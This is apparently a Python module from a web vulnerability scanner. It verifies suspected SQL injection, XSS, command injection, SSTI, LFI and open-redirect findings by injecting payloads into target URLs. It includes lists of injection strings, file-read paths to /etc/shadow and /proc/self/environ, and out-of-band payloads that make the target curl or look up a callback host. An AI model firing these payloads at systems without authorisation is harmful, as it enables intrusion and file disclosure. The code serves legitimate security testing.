"""VerificationEngine — post-scan verification pipeline.

Takes low-confidence findings (DETECTED, score < 60) and systematically
promotes them to the highest achievable stage using every available tool:
response diffing, timing analysis, OOB callbacks, browser execution,
error-pattern matching, and content-based fingerprinting.

Design principle: each finding must *earn* its confidence score.
We promote findings, not guess them.
"""

import hashlib
import re
import threading
import time
from typing import Any
from urllib.parse import urlparse, urlencode, parse_qs, urlunparse

from models.finding import Finding, calculate_confidence
from modules.utils import (
    log, Colors, VerificationStage, EvidenceStrength, FalsePositiveRisk,
    safe_get, make_session,
)

# ── Extended detection patterns ──────────────────────────────────────────────

SQLI_ERROR_PATTERNS = [
    r"SQL syntax.*MariaDB|MySQL",
    r"Warning.*mysql_",
    r"MySQLSyntaxErrorException",
    r"valid MySQL result",
    r"PostgreSQL.*ERROR",
    r"Warning.*\Wpg_",
    r"valid PostgreSQL result",
    r"Driver.*SQL Server",
    r"OLE DB.*SQL Server",
    r"\bSQLite/JDBCDriver",
    r"SQLite\.Exception",
    r"System\.Data\.SQLClient",
    r"Unclosed quotation mark",
    r"Microsoft OLE DB.*SQL",
    r"ODBC SQL Server Driver",
    r"Dynamic SQL Error",
    r"Syntax error.*SQL statement",
    r"Division by zero.*SQL",
    r"Incorrect syntax near",
    r"Unknown column",
    r"Table '.+' doesn't exist",
    r"Column count doesn't match",
]

LFI_PATHS = [
    ("/etc/passwd", "root:"),
    ("/etc/shadow", "root:"),
    ("/etc/hostname", ""),
    ("/proc/self/environ", "HOME="),
    ("/proc/self/cmdline", ""),
    ("/proc/version", "Linux version"),
    ("/etc/issue", ""),
    ("/etc/os-release", "PRETTY_NAME"),
    ("/etc/group", "root:"),
    ("/etc/mysql/my.cnf", "[client]"),
    ("/etc/php.ini", "PHP"),
    ("/etc/httpd.conf", ""),
    ("/etc/nginx/nginx.conf", "worker_processes"),
    ("C:\\windows\\win.ini", "fonts"),
    ("C:\\windows\\system32\\drivers\\etc\\hosts", "127.0.0.1"),
    ("C:\\boot.ini", "boot loader"),
    ("/proc/self/status", "Name:"),
    ("/proc/self/environ", "PATH="),
    ("/proc/self/fd/0", ""),
    ("/proc/self/fd/1", ""),
    ("/proc/self/fd/2", ""),
]

CMDI_TIME_PAYLOADS = [
    ("; sleep 5", 4.5),
    ("| sleep 5", 4.5),
    ("& sleep 5 &", 4.5),
    ("`sleep 5`", 4.5),
    ("$(sleep 5)", 4.5),
    ("; ping -c 5 127.0.0.1", 4.5),
    ("| ping -n 5 127.0.0.1", 4.5),
    ("; timeout 5", 4.5),
]

CMDI_OUTPUT_PAYLOADS = [
    ("; echo VULN_TEST_MARKER", "VULN_TEST_MARKER"),
    ("| echo VULN_TEST_MARKER", "VULN_TEST_MARKER"),
    ("`echo VULN_TEST_MARKER`", "VULN_TEST_MARKER"),
    ("$(echo VULN_TEST_MARKER)", "VULN_TEST_MARKER"),
    ("; whoami", ""),
    ("| whoami", ""),
    ("; id", "uid="),
    ("| id", "uid="),
    ("; uname -a", "Linux"),
    ("| uname -a", "Linux"),
]

SSTI_PROBES = [
    ("{{7*7}}", "49"),
    ("${7*7}", "49"),
    ("#{7*7}", "49"),
    ("<%=7*7%>", "49"),
    ("{{7*'7'}}", "7777777"),
    ("${7*'7'}", "7777777"),
    ("<%=7*7%>", "49"),
    ("{{config}}", "SECRET_KEY"),
    ("{{self}}", "<Template"),
    ("{{''.__class__.__mro__}}", "__main__"),
]

SQLI_TIME_PAYLOADS = [
    ("' OR SLEEP(5)--", 4.5),
    ("\" OR SLEEP(5)--", 4.5),
    ("'; WAITFOR DELAY '0:0:5'--", 4.5),
    ("1' OR SLEEP(5)--", 4.5),
    ("1\" OR SLEEP(5)--", 4.5),
    ("' OR SLEEP(5) OR '", 4.5),
    ("' OR pg_sleep(5)--", 4.5),
    ("') OR pg_sleep(5)--", 4.5),
    ("1' OR pg_sleep(5)--", 4.5),
    ("' OR 1=1; WAITFOR DELAY '0:0:5'--", 4.5),
    ("1; SELECT SLEEP(5)--", 4.5),
]


class VerificationEngine:
    """Systematic finding verifier.

    Parameters
    ----------
    config : dict
        Scan configuration.
    container : ApplicationContainer or None
        Dependency injection container with OOB, browser, evidence.
    capabilities : dict-like or None
        Set of available capabilities (browser_validation, oob_validation, etc.).
    """

    def __init__(self, config: dict, container=None, capabilities=None):
        self.config = config
        self.container = container
        self.capabilities = capabilities or {}
        self._session = make_session(config)

        if container:
            self.oob = getattr(container, "oob_framework", None)
            self.browser = getattr(container, "browser_validator", None)
            self.oob_available = bool(self.oob and self.oob.oob_host)
        else:
            self.oob = None
            self.browser = None
            self.oob_available = bool(config.get("oob_host"))

        self.browser_available = bool(self.browser)
        self._timeout = config.get("timeout", 10)

    def verify_all(self, findings: list[Finding]) -> list[Finding]:
        """Run verification on all findings below 60 confidence."""
        for f in findings:
            if f.get("confidence_score", 0) >= 60:
                continue
            if f.get("verification_stage", "") in ("verified", "exploitable"):
                continue
            try:
                self.verify(f)
            except Exception as e:
                log(f"  [Verify] Error: {e}", Colors.WHITE,
                    verbose_only=True, verbose=self.config.get("verbose", False))
        return findings

    def verify(self, finding: Finding) -> Finding:
        """Run appropriate verification checks for this finding type."""
        vuln_type = (finding.get("vuln_type") or finding.get("type", "")).lower()
        if "sqli" in vuln_type:
            self._verify_sqli(finding)
        elif "xss" in vuln_type:
            self._verify_xss(finding)
        elif "ssrf" in vuln_type:
            self._try_oob(finding, "ssrf")
        elif "xxe" in vuln_type:
            self._try_oob(finding, "xxe")
        elif "cmdi" in vuln_type or "command" in vuln_type:
            self._verify_cmdi(finding)
        elif "ssti" in vuln_type:
            self._verify_ssti(finding)
        elif "lfi" in vuln_type or "path traversal" in vuln_type:
            self._verify_lfi(finding)
        elif "open redirect" in vuln_type:
            self._verify_open_redirect(finding)
        return finding

    def _promote(self, f: Finding, stage: str, evidence_parts: list[str] | None = None) -> None:
        stage = stage.lower()
        f["verification_stage"] = stage
        f["confidence_score"] = calculate_confidence(
            detection=True,
            validation=stage in ("validated", "exploitable", "verified"),
            exploitation=stage in ("exploitable", "verified"),
        )
        f["evidence_strength"] = EvidenceStrength.from_score(f["confidence_score"]).value
        f["false_positive_risk"] = FalsePositiveRisk.from_score(f["confidence_score"]).value
        if evidence_parts:
            existing = f.get("evidence", [])
            if not isinstance(existing, list):
                existing = [str(existing)] if existing else []
            existing.extend(evidence_parts)
            f["evidence"] = existing
        reasons = f.get("confidence_reasons")
        if not isinstance(reasons, list):
            reasons = []
        if stage == "validated":
            reasons.append("+ Secondary validation confirmed (VerificationEngine)")
            if not any("Detection signal" in r for r in reasons):
                reasons.insert(0, "+ Detection signal present")
        elif stage == "exploitable":
            if not any("Exploitation proof" in r for r in reasons):
                reasons.append("+ Exploitation proof demonstrated (VerificationEngine)")
            if not any("Secondary validation" in r for r in reasons):
                reasons.append("+ Secondary validation confirmed (VerificationEngine)")
        elif stage == "verified":
            if not any("Independently verified" in r for r in reasons):
                reasons.append("+ Independently verified (VerificationEngine)")
            if not any("Exploitation proof" in r for r in reasons):
                reasons.append("+ Exploitation proof demonstrated (VerificationEngine)")
        f["confidence_reasons"] = reasons
        log(f"  [Verify] {f.get('vuln_type', '')} @ {f.get('url', '')} promoted to {stage.upper()} (score={f['confidence_score']})",
            Colors.GREEN)

    def _test_time_delay(self, base_url: str, param: str, payloads: list[tuple[str, float]]) -> tuple[bool, str]:
        """Test time-based payloads and return (success, evidence)."""
        for payload, threshold in payloads:
            test_url = self._inject_param(base_url, param, payload)
            delays = []
            for _ in range(2):
                start = time.time()
                safe_get(self._session, test_url, max(15, int(threshold) + 10), raise_for_status=False)
                delays.append(time.time() - start)
            avg_delay = sum(delays) / len(delays)
            if min(delays) >= threshold:
                return True, f"time:delay={avg_delay:.2f}s (payload: {payload[:30]})"
        return False, ""

    def _test_boolean_blind(self, url: str, param: str) -> tuple[bool, str]:
        """Test boolean-based SQLi with multiple comparison pairs."""
        pairs = [
            ("AND 1=1", "AND 1=2"),
            ("AND 1=1", "AND 1=0"),
            ("' AND '1'='1", "' AND '1'='2"),
            ("' AND 1=1--", "' AND 1=2--"),
            ("\" AND \"1\"=\"1", "\" AND \"1\"=\"2"),
        ]
        baseline = safe_get(self._session, url, self._timeout)
        if not baseline:
            return False, ""
        base_hash = hashlib.md5(baseline.text.encode()).hexdigest()
        base_len = len(baseline.text)

        for true_s, false_s in pairs:
            true_url = self._inject_param(url, param, f"1 {true_s}")
            false_url = self._inject_param(url, param, f"1 {false_s}")
            t_resp = safe_get(self._session, true_url, self._timeout)
            f_resp = safe_get(self._session, false_url, self._timeout)
            if t_resp and f_resp:
                t_hash = hashlib.md5(t_resp.text.encode()).hexdigest()
                f_hash = hashlib.md5(f_resp.text.encode()).hexdigest()
                t_len = len(t_resp.text)
                f_len = len(f_resp.text)
                if base_hash == t_hash and base_hash != f_hash:
                    return True, f"boolean:{true_s} vs {false_s}"
                if abs(t_len - f_len) > 50 and base_hash == t_hash:
                    return True, f"boolean_size:{t_len} vs {f_len}"

        return False, ""

    def _check_sqli_error_patterns(self, text: str) -> list[str]:
        """Check response text for SQL error patterns."""
        matched = []
        for pattern in SQLI_ERROR_PATTERNS:
            if re.search(pattern, text, re.IGNORECASE):
                matched.append(pattern)
        return matched

    def _verify_sqli(self, f: Finding) -> None:
        if f.get("verification_stage") in ("verified", "exploitable"):
            return
        url = f.get("url", "")
        param = f.get("parameter", "")
        if not param or not url:
            return

        # Phase 1: OOB (strongest signal)
        if self.oob_available:
            self._try_oob(f, "sqli")
            if f.get("verification_stage") == "verified":
                return

        current_steps = f.get("validation_steps", [])

        # Phase 2: Time-based detection
        has_time = any("time" in s.lower() or "delay" in s.lower() for s in current_steps)
        if not has_time:
            success, evidence = self._test_time_delay(url, param, SQLI_TIME_PAYLOADS)
            if success:
                self._promote(f, "validated", [evidence])
                has_time = True

        # Phase 3: Boolean-based detection
        has_boolean = any("boolean" in s.lower() or "1=1" in s for s in current_steps)
        if not has_boolean and not has_time:
            success, evidence = self._test_boolean_blind(url, param)
            if success:
                self._promote(f, "validated", [evidence])
                has_boolean = True

        # Phase 4: Error-based detection (additional signal)
        current_error_signals = sum(1 for s in current_steps if "error" in s.lower())
        if current_error_signals < 2:
            payloads = ["'", "\"", "1'", "1\"", "' OR '1'='1", "\" OR \"1\"=\"1"]
            error_matches = set()
            for payload in payloads:
                test_url = self._inject_param(url, param, payload)
                resp = safe_get(self._session, test_url, self._timeout, raise_for_status=False)
                if resp:
                    matches = self._check_sqli_error_patterns(resp.text)
                    for m in matches:
                        error_matches.add(m)
            if len(error_matches) >= 2:
                evidence = f"error_patterns:{','.join(list(error_matches)[:3])}"
                current_validation = f.get("validation_steps", [])
                if not current_validation:
                    self._promote(f, "validated", [evidence])
                else:
                    f.setdefault("validation_steps", []).extend(
                        [f"error_signals:{len(error_matches)}"]
                    )

        # If we detected both time AND boolean, promote further
        if has_time and has_boolean and f.get("verification_stage") not in ("verified", "exploitable"):
            self._promote(f, "exploitable", ["multi_signal:time+boolean"])

    def _verify_xss(self, f: Finding) -> None:
        if not self.browser_available:
            return
        if f.get("verification_stage") in ("verified", "exploitable"):
            return
        url = f.get("url", "")
        param = f.get("parameter", "")
        if not param or not url:
            return

        # Try multiple XSS payloads for browser confirmation
        payloads = [
            "<script>alert(1)</script>",
            "<img src=x onerror=alert(1)>",
            "<svg/onload=alert(1)>",
            "';alert(1)//",
            "\"><script>alert(1)</script>",
        ]
        for payload in payloads:
            test_url = self._inject_param(url, param, payload)
            exec_result = self.browser.check_xss_execution(test_url, payload) if self.browser else None
            if exec_result and (exec_result.get("alert_fired") or exec_result.get("dom_mutation")):
                self._promote(f, "verified", [f"browser:alert_fired (payload: {payload[:30]})"])
                return

    def _verify_cmdi(self, f: Finding) -> None:
        url = f.get("url", "")
        param = f.get("parameter", "")
        if not param or not url:
            return

        current_steps = f.get("validation_steps", [])
        has_time = any("time" in s.lower() or "delay" in s.lower() for s in current_steps)
        has_output = any("output" in s.lower() or "marker" in s.lower() for s in current_steps)

        # Phase 1: Output-based detection
        if not has_output:
            for payload, marker in CMDI_OUTPUT_PAYLOADS:
                test_url = self._inject_param(url, param, payload)
                resp = safe_get(self._session, test_url, self._timeout, raise_for_status=False)
                if resp:
                    if marker and marker in resp.text:
                        self._promote(f, "exploitable", [f"output:{marker} (payload: {payload[:30]})"])
                        has_output = True
                        break
                    if not marker and len(resp.text) > 200:
                        self._promote(f, "validated", [f"output:large_response ({len(resp.text)} bytes)"])
                        has_output = True
                        break

        # Phase 2: Time-based detection
        if not has_time:
            success, evidence = self._test_time_delay(url, param, CMDI_TIME_PAYLOADS)
            if success:
                self._promote(f, "validated", [evidence])
                has_time = True

        # Phase 3: OOB
        if self.oob_available and f.get("confidence_score", 0) < 100:
            self._try_oob(f, "cmdi")

        # Combined signals
        if has_time and has_output and f.get("verification_stage") not in ("verified", "exploitable"):
            self._promote(f, "exploitable", ["multi_signal:time+output"])

    def _verify_ssti(self, f: Finding) -> None:
        url = f.get("url", "")
        param = f.get("parameter", "")
        if not param or not url:
            return

        current_steps = f.get("validation_steps", [])
        has_math = any("7*7" in s or "49" in s or "7777777" in s for s in current_steps)

        if not has_math:
            for probe, expected in SSTI_PROBES:
                test_url = self._inject_param(url, param, probe)
                resp = safe_get(self._session, test_url, self._timeout, raise_for_status=False)
                if resp and expected in resp.text:
                    self._promote(f, "exploitable" if expected != "49" else "validated",
                                  [f"ssti:{probe[:20]} eval -> {expected}"])
                    has_math = True
                    break

        if self.oob_available and f.get("confidence_score", 0) < 100:
            self._try_oob(f, "ssti")

    def _verify_lfi(self, f: Finding) -> None:
        url = f.get("url", "")
        param = f.get("parameter", "")
        if not param or not url:
            return

        for path, marker in LFI_PATHS:
            # Try direct and encoded variants
            variants = [path, path.replace("/", "%2F"), path.replace("/", "..%2F")]
            for variant in variants:
                test_url = self._inject_param(url, param, variant)
                resp = safe_get(self._session, test_url, self._timeout, raise_for_status=False)
                if resp:
                    if marker and marker in resp.text:
                        self._promote(f, "exploitable", [f"lfi:file_read {path}"])
                        return
                    if len(resp.text) > 500:
                        self._promote(f, "validated", [f"lfi:large_response {path} ({len(resp.text)} bytes)"])
                    if len(resp.text) > 100:
                        self._promote(f, "validated", [f"lfi:changed_response {path}"])

    def _verify_open_redirect(self, f: Finding) -> None:
        url = f.get("url", "")
        if not url:
            return
        resp = safe_get(self._session, url, 10, allow_redirects=True, raise_for_status=False)
        if resp:
            final_url = resp.url
            target = self.config.get("target", "")
            if final_url != url and not final_url.startswith(target.rstrip("/")):
                self._promote(f, "validated", [f"redirect:{final_url}"])
            # Also check for open redirect via common parameters if not already done
            parsed = urlparse(url)
            params = parse_qs(parsed.query, keep_blank_values=True)
            for param_name, values in params.items():
                for val in values:
                    if val.startswith(("http://", "https://", "//")):
                        if not val.startswith(target.rstrip("/")):
                            self._promote(f, "validated", [f"redirect_param:{param_name}={val}"])

    def _try_oob(self, f: Finding, vuln_type: str) -> None:
        if not self.oob_available or not self.oob:
            return
        url = f.get("url", "")
        param = f.get("parameter", "")
        if not param or not url:
            return

        oob_host = self.oob.callback_host
        if not oob_host:
            return

        if vuln_type == "ssrf":
            oob_payloads = [f"http://{oob_host}/verify-ssrf", f"https://{oob_host}/verify-ssrf"]
        elif vuln_type == "cmdi":
            oob_payloads = [
                f"; curl http://{oob_host}/verify-cmdi",
                f"| nslookup {oob_host}",
                f"`curl http://{oob_host}/verify-cmdi`",
                f"$(curl http://{oob_host}/verify-cmdi)",
            ]
        elif vuln_type == "sqli":
            oob_payloads = [
                f"'; exec master..xp_dirtree '//{oob_host}/sqli'--",
                f"' UNION SELECT LOAD_FILE('\\\\\\\\{oob_host}\\\\sqli')--",
                f"'; SELECT * FROM OPENROWSET('SQLOLEDB', '{oob_host}';'sa';'pwd', 'select 1')--",
            ]
        elif vuln_type == "ssti":
            oob_payload = self.oob.generate_payload(
                "{{config.__class__.__init__.__globals__['os'].popen('curl http://{oob}/ssti').read()}}"
            )
            if not oob_payload:
                return
            test_url = self._inject_param(url, param, oob_payload)
            safe_get(self._session, test_url, 10, raise_for_status=False)
            self.oob.register_interaction(vuln_type, oob_payload, url)
            confirmed = self.oob.poll()
            if confirmed:
                self._promote(f, "verified", ["oob:callback"])
            return
        elif vuln_type == "xxe":
            return
        else:
            return

        for payload in oob_payloads:
            test_url = self._inject_param(url, param, payload)
            safe_get(self._session, test_url, 10, raise_for_status=False)
            self.oob.register_interaction(vuln_type, payload, url)

        confirmed = self.oob.poll()
        if confirmed:
            self._promote(f, "verified", ["oob:callback"])

    @staticmethod
    def _inject_param(url: str, param: str, value: str) -> str:
        parsed = urlparse(url)
        params = parse_qs(parsed.query, keep_blank_values=True)
        params[param] = [value]
        new_query = urlencode(params, doseq=True)
        return urlunparse(parsed._replace(query=new_query))
